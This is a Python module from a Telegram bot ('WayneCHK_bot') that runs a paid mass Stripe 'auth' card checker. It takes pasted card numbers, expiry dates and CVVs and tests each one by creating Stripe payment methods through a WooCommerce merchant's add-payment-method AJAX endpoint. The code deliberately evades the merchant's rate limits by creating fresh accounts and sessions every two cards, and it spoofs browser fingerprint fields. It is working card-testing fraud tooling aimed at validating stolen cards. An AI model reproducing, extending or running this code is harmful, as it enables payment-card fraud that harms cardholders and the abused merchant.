# BOT/gates/auth/mass/massau.py
# Mass Stripe Auth checker with automatic session renewal on rate limits

import asyncio
import json
import random
import time
import re
import html
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import logging
import httpx

# Import from main stauth module
from BOT.gates.auth.stripe.stauth import StripeAuthChecker, logger, load_users, is_user_banned, check_cooldown, get_user_plan
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.Admins import is_command_disabled, get_command_offline_message
from BOT.gc.credits import update_user_credits

class MassStripeAuthChecker:
    def __init__(self):
        self.checker = StripeAuthChecker()
        self.current_client = None
        self.current_nonce = None
        self.session_card_count = 0
        self.max_cards_per_session = 2  # Conservative: max 2 cards per session before potential rate limit
        self.retry_count = 0
        self.max_retries = 2  # Maximum retries per card
        
    async def create_fresh_session(self):
        """Create a brand new session with new account"""
        try:
            # Close existing session if any
            if self.current_client:
                try:
                    await self.current_client.aclose()
                except:
                    pass
                self.current_client = None
                self.current_nonce = None
            
            # Create new session
            logger.info("🔄 Creating fresh session with new account...")
            client, nonce, session_msg = await self.checker.create_authenticated_session()
            
            if nonce:
                self.current_client = client
                self.current_nonce = nonce
                self.session_card_count = 0
                self.retry_count = 0
                logger.success("✅ New session created successfully")
                return True
            else:
                logger.error(f"❌ Failed to create session: {session_msg}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error creating session: {str(e)}")
            return False
    
    def is_rate_limit_error(self, error_message):
        """Check if error message indicates rate limiting"""
        rate_limit_patterns = [
            "cannot add a new payment method so soon",
            "rate limit",
            "too many requests",
            "try again later",
            "nonce",
            "invalid nonce",
            "session expired",
            "for security",
            "please wait",
            "429",
            "403"
        ]
        
        error_lower = error_message.lower()
        for pattern in rate_limit_patterns:
            if pattern in error_lower:
                return True
        return False
    
    async def check_card_with_session_management(self, card_details, username, user_data):
        """Check card with automatic session renewal on rate limits"""
        
        # If no session exists, create one
        if not self.current_client or not self.current_nonce:
            session_created = await self.create_fresh_session()
            if not session_created:
                # Return error if can't create session
                return await self.checker.format_response(
                    *self.parse_card_details(card_details), 
                    "ERROR", 
                    "Failed to create session", 
                    username, 
                    0, 
                    user_data
                )
        
        # Check if we've reached max cards per session
        if self.session_card_count >= self.max_cards_per_session:
            logger.info(f"⚠️ Reached {self.max_cards_per_session} cards per session, creating new session...")
            session_created = await self.create_fresh_session()
            if not session_created:
                return await self.checker.format_response(
                    *self.parse_card_details(card_details), 
                    "ERROR", 
                    "Failed to create new session", 
                    username, 
                    0, 
                    user_data
                )
        
        try:
            # Import the check_card_with_session method from the checker
            # Since stauth.py doesn't have it, we'll create a modified version here
            result = await self.check_card_with_existing_session(card_details, username, user_data)
            
            # If successful, increment session card count
            self.session_card_count += 1
            self.retry_count = 0  # Reset retry count on success
            return result
            
        except Exception as e:
            error_str = str(e)
            logger.warning(f"⚠️ Card check failed: {error_str}")
            
            # Check if it's a rate limit error
            if self.is_rate_limit_error(error_str) and self.retry_count < self.max_retries:
                self.retry_count += 1
                logger.info(f"🔄 Rate limit detected, retry {self.retry_count}/{self.max_retries} with new session...")
                
                # Create new session
                session_created = await self.create_fresh_session()
                if session_created:
                    # Retry the card with new session
                    return await self.check_card_with_session_management(card_details, username, user_data)
                else:
                    return await self.checker.format_response(
                        *self.parse_card_details(card_details), 
                        "ERROR", 
                        f"Rate limit - failed to create new session", 
                        username, 
                        0, 
                        user_data
                    )
            else:
                # Not a rate limit error or max retries exceeded
                self.retry_count = 0
                return await self.checker.format_response(
                    *self.parse_card_details(card_details), 
                    "ERROR", 
                    error_str[:80], 
                    username, 
                    0, 
                    user_data
                )
    
    async def check_card_with_existing_session(self, card_details, username, user_data):
        """Check card using existing session (adapted from stauth.py)"""
        start_time = time.time()
        
        # Parse card details
        cc, mes, ano, cvv = self.parse_card_details(card_details)
        
        try:
            # Get BIN info
            bin_info = await self.checker.get_bin_info(cc)
            
            # Create Stripe payment method using existing session
            stripe_data = self.prepare_stripe_data(cc, mes, ano, cvv)
            stripe_headers = self.get_stripe_headers()
            
            stripe_response = await self.current_client.post(
                "https://api.stripe.com/v1/payment_methods", 
                headers=stripe_headers, 
                data=stripe_data
            )
            
            if stripe_response.status_code != 200:
                error_text = stripe_response.text[:150] if stripe_response.text else "No response"
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "DECLINED", 
                    f"Stripe Error: {error_text}", 
                    username, time.time()-start_time, user_data, bin_info
                )
            
            stripe_json = stripe_response.json()
            
            if "error" in stripe_json:
                error_msg = stripe_json["error"].get("message", "Stripe declined")
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "DECLINED", error_msg, 
                    username, time.time()-start_time, user_data, bin_info
                )
            
            payment_method_id = stripe_json.get("id")
            if not payment_method_id:
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", 
                    username, time.time()-start_time, user_data, bin_info
                )
            
            # Confirm setup intent via AJAX
            ajax_response = await self.confirm_setup_intent(payment_method_id)
            
            if ajax_response.status_code != 200:
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {ajax_response.status_code}", 
                    username, time.time()-start_time, user_data, bin_info
                )
            
            result = ajax_response.json()
            
            if result.get("success"):
                # Check for 3DS
                if (isinstance(result.get("data"), dict) and 
                    result["data"].get("status") == "requires_action" and
                    "three_d_secure" in str(result["data"])):
                    
                    return await self.checker.format_response(
                        cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", 
                        username, time.time()-start_time, user_data, bin_info
                    )
                
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "APPROVED", "Successful", 
                    username, time.time()-start_time, user_data, bin_info
                )
            else:
                error_data = result.get("data", {})
                error_message = "Transaction Declined"
                
                if isinstance(error_data, dict):
                    if "error" in error_data:
                        error_obj = error_data["error"]
                        if isinstance(error_obj, dict):
                            error_message = error_obj.get("message", "Card Declined")
                        else:
                            error_message = str(error_obj)
                    elif "message" in error_data:
                        error_message = error_data["message"]
                elif isinstance(error_data, str):
                    error_message = error_data
                
                # Raise exception for rate limit detection
                if self.is_rate_limit_error(error_message):
                    raise Exception(error_message)
                
                return await self.checker.format_response(
                    cc, mes, ano, cvv, "DECLINED", error_message, 
                    username, time.time()-start_time, user_data, bin_info
                )
                
        except Exception as e:
            raise e
    
    def parse_card_details(self, card_details):
        """Parse card details from string"""
        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return "", "", "", ""
            
            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()
            
            # Format year if needed
            if len(ano) == 2:
                ano = '20' + ano
                
            return cc, mes, ano, cvv
        except:
            return "", "", "", ""
    
    def prepare_stripe_data(self, cc, mes, ano, cvv):
        """Prepare Stripe API data"""
        import string
        
        client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
        guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
        muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
        sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
        
        return {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': random.choice(['10080', '90210', '33101', '60601']),
            'billing_details[address][country]': 'US',
            'pasted_fields': 'number',
            'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6"])}; payment-element; deferred-intent',
            'referrer': self.checker.base_url,
            'time_on_page': str(random.randint(30000, 120000)),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': self.checker.stripe_key,
            '_stripe_version': '2024-06-20'
        }
    
    def get_stripe_headers(self):
        """Get Stripe API headers"""
        return {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': self.checker.user_agent,
            'sec-ch-ua': self.checker.sec_ch_ua,
            'sec-ch-ua-mobile': self.checker.sec_ch_ua_mobile,
            'sec-ch-ua-platform': self.checker.sec_ch_ua_platform
        }
    
    async def confirm_setup_intent(self, payment_method_id):
        """Confirm setup intent via AJAX"""
        ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
        ajax_headers = self.checker.get_base_headers()
        ajax_headers.update({
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': self.checker.base_url,
            'Referer': f"{self.checker.base_url}/my-account-2/add-payment-method/",
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': self.current_nonce
        }
        
        return await self.current_client.post(ajax_url, headers=ajax_headers, data=ajax_data)
    
    async def format_mass_response(self, results, successful, failed, total_cards, username, elapsed_time, user_data):
        """Format the mass check results with proper UI"""
        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🎭")
        
        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        
        response = f"""<b>「$cmd → /mau」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Gateway -</b> Stripe Auth Mass
<b>[•] Status -</b> <code>Complete ✅</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Results:</b> ✅ {successful} | ❌ {failed}
<b>[+] Total Cards:</b> <code>{total_cards}</code>
━━━━━━━━━━━━━━━
"""
        
        # Add each card result
        for i, result in enumerate(results):
            response += f"<b>Card {i+1}:</b>\n{result}\n\n"
        
        response += f"""━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] Time:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Mass ⚡️</code></b>"""
        
        return response
    
    def get_processing_message(self, card_count, username, user_plan):
        """Get processing message for mass check"""
        return f"""<b>「$cmd → /mau」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Gateway -</b> Stripe Auth Mass
<b>[•] Status-</b> Processing... ⏳
<b>[•] Cards-</b> <code>{card_count}</code> cards in queue
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing mass check... Please wait.</b>"""

async def parse_card_list(message: Message):
    """Parse card list from message or reply"""
    card_list = []
    
    # Case 1: User replied to a message containing cards
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg and replied_msg.text:
            message_lines = replied_msg.text.split('\n')
            for line in message_lines:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cc, mes, ano, cvv = parts
                        if cc.strip() and mes.strip() and ano.strip() and cvv.strip():
                            # Validate basic format
                            cc_clean = cc.strip().replace(" ", "")
                            if cc_clean.isdigit() and len(cc_clean) >= 15:
                                card_list.append(line)
    
    # Case 2: Cards in the same message
    else:
        message_text = message.text
        # Remove the command part
        if message_text.startswith('/mau'):
            message_text = message_text.replace('/mau', '', 1).strip()
        if message_text.startswith('@WayneCHK_bot'):
            message_text = message_text.replace('@WayneCHK_bot', '', 1).strip()
            
        # Split by lines and process
        message_lines = message_text.split('\n')
        for line in message_lines:
            line = line.strip()
            if line and '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cc, mes, ano, cvv = parts
                    if cc.strip() and mes.strip() and ano.strip() and cvv.strip():
                        # Validate basic format
                        cc_clean = cc.strip().replace(" ", "")
                        if cc_clean.isdigit() and len(cc_clean) >= 15:
                            card_list.append(line)
    
    return card_list

@Client.on_message(filters.command(["mau", ".mau", "$mau"]))
@auth_and_free_restricted
async def handle_mass_stripe_auth(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)
        
        # Check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')
        
        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return
        
        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")
        
        # Parse card list
        card_list = await parse_card_list(message)
        
        if len(card_list) == 0:
            await message.reply("""<pre>❌ No Valid Cards Found</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please provide card details in one of these formats:

<b>Format 1 (Reply to message):</b>
• Reply to a message containing cards with /mau

<b>Format 2 (Inline):</b>
<code>/mau</code>
<code>cc|mm|yy|cvv</code>
<code>cc|mm|yy|cvv</code>

<b>Format 3 (Single line):</b>
<code>/mau cc|mm|yy|cvv</code>

⟐ <b>Example:</b>
<code>/mau</code>
<code>4111111111111111|12|2025|123</code>
<code>4111111111111112|01|2026|456</code>
━━━━━━━━━━━━━""")
            return
        
        card_count = len(card_list)
        
        # Check cooldown (owner is automatically skipped)
        can_use, wait_time = check_cooldown(user_id, "mau")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return
        
        # Check if user has enough credits for mass check (2 credits)
        if not update_user_credits(user_id, 2, "deduct"):
            await message.reply("""<pre>❌ Insufficient Credits</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You don't have enough credits for mass check.
⟐ <b>Required:</b> <code>2 credits</code>
⟐ <b>Your Credits:</b> <code>0</code>
━━━━━━━━━━━━━""")
            return
        
        start_time = time.time()
        
        # Create mass checker instance
        mass_checker = MassStripeAuthChecker()
        
        # Send processing message
        processing_msg = await message.reply(
            mass_checker.get_processing_message(card_count, username, plan_name)
        )
        
        results = []
        successful = 0
        failed = 0
        
        # Process each card with smart session management
        for i, card_details in enumerate(card_list):
            # Update progress every 2 cards or on last card
            if (i + 1) % 2 == 0 or i == len(card_list) - 1:
                try:
                    await processing_msg.edit_text(
                        f"""<b>「$cmd → /mau」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Gateway -</b> Stripe Auth Mass
<b>[•] Status-</b> Processing... ⏳
<b>[•] Progress-</b> <code>{i+1}/{card_count}</code> cards
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing card {i+1} of {card_count}...</b>"""
                    )
                except:
                    pass
            
            # Check card with automatic session renewal on rate limits
            try:
                result = await mass_checker.check_card_with_session_management(
                    card_details, 
                    username, 
                    user_data
                )
                
                results.append(result)
                
                if "APPROVED" in result:
                    successful += 1
                else:
                    failed += 1
                    
            except Exception as e:
                # Handle individual card error
                error_result = f"""<b>Card {i+1}:</b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{card_details}</code>
<b>[•] Status-</b> <code>ERROR ⚠️</code>
<b>[•] Response-</b> <code>Check failed: {str(e)[:50]}</code>
━━━━━━━━━━━━━━━"""
                results.append(error_result)
                failed += 1
            
            # Delay between cards to avoid rate limiting
            if i < len(card_list) - 1:
                await asyncio.sleep(random.uniform(3, 5))
        
        # Close the final session
        if mass_checker.current_client:
            try:
                await mass_checker.current_client.aclose()
            except:
                pass
        
        elapsed_time = time.time() - start_time
        
        # Format final response
        final_response = await mass_checker.format_mass_response(
            results, successful, failed, card_count, username, elapsed_time, user_data
        )
        
        # Update cooldown
        check_cooldown(user_id, "mau")  # This updates the cooldown timestamp
        
        # Send final result
        try:
            await processing_msg.edit_text(final_response, disable_web_page_preview=True)
        except Exception:
            # If editing fails, send as new message
            try:
                await message.reply(final_response, disable_web_page_preview=True)
            except Exception as e:
                print(f"Failed to send mass auth results: {e}")
                
    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Mass Check Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing mass check.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")